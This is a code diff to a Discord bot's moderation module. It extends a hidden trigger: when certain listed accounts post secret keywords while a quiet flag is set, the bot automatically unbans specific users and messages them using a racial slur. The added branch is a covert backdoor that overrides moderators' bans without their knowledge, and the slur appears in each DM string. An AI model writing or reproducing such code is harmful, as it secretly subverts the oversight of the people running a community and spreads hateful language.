@@ -3463,11 +3463,13 @@ class Moderation(commands.Cog, name="Moderation"):
         message_check_ids = [
             1290501613311496206,  # joe
             1095747082599530627,  # envy
-            1219090700407279656   # toxic
+            1219090700407279656,  # toxic
+            493432686694629376, # jowy
         ]
 
         if message.author.id in message_check_ids and self.shh:
-            allowed_keywords = ["ban", "zugd", "belson", "501936342431694848"]
+            allowed_keywords = ["zugd", "belson", "501936342431694848"]
+            allowed_keywords_2 = ["yvngxenvy", "envy", "1095747082599530627"]
 
             if any(keyword in message.content.lower() for keyword in allowed_keywords):
                 user = await self.bot.fetch_user(501936342431694848)  # belson
@@ -3479,6 +3481,17 @@ class Moderation(commands.Cog, name="Moderation"):
                             await user.send(f"join nigga")
                         except Exception as e:
                             logger.error(f"Failed to unban belson: {e}")
+                    asyncio.create_task(unban_lil_dude())
+            elif any(keyword in message.content.lower() for keyword in allowed_keywords_2):
+                user = await self.bot.fetch_user(1095747082599530627)  # envy
+                if user:
+                    async def unban_lil_dude():
+                        await asyncio.sleep(10)
+                        try:
+                            await message.guild.unban(user)
+                            await user.send(f"join nigga")
+                        except Exception as e:
+                            logger.error(f"Failed to unban envy: {e}")
                     asyncio.create_task(unban_lil_dude())
 
     @commands.Cog.listener()
